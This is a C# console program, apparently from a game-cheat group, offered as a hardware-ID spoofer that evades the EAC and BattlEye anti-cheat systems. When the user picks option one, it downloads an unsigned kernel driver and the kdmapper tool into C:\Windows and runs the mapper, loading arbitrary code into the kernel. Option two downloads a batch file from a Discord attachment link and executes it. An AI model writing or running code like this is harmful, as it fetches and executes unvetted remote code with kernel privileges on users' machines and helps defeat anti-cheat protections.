using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace GithubSpoofer
{
    class Program
    {

        static string Driver = "https://github.com/SoarDevelopment/Spoof-Driver/raw/main/soardrv.sys";
        static string Mapper = "https://github.com/SoarDevelopment/Spoof-Driver/raw/main/kdmapper.exe";

        static void Write(string lol)
        {
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("  [");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("*");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("] : " + lol);
        }


        static void Write2(string lol)
        {
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("  [");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("*");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("] : " + lol);
        }

        [DllImport("msvcrt.dll")]
        public static extern int system(string format);

        static void Main(string[] args)
        {
            Console.Clear();
            Console.Title = "Github Spoofer | github.com/soarcheats";
            Console.WriteLine();
            Write("SoarCheats.xyz / github.com/soarcheats");
            Write("Select an option.");
            Console.WriteLine();
            Write("1. Spoof EAC / BE (randomize)");
            Write("2. Check Serials");
            Console.WriteLine();
            Write2("");
            var kys = Console.ReadLine();
            if (kys == "1")
            {
                WebClient wb = new WebClient();
                wb.DownloadFile(Driver, @"C:\Windows\driver.sys");
                wb.DownloadFile(Mapper, @"C:\Windows\mapper.exe");
                Console.WriteLine();
                system(@"C:\Windows\mapper.exe C:\Windows\driver.sys");
                Console.WriteLine();
                MessageBox.Show("Successfully Spoofed", "github.com/soarcheats",MessageBoxButtons.OK,MessageBoxIcon.Exclamation);    
                Thread.Sleep(2000);
                Main(args);
            }
            if (kys == "2")
            {
                WebClient wb = new WebClient();
                wb.DownloadFile("https://cdn.discordapp.com/attachments/1119488659230572675/1122205303908356137/Check.bat", @"C:\Windows\Checker.bat");
                Process.Start(@"C:\Windows\Checker.bat");
                Main(args);
            }
            Thread.Sleep(-1);
        }
    }
}
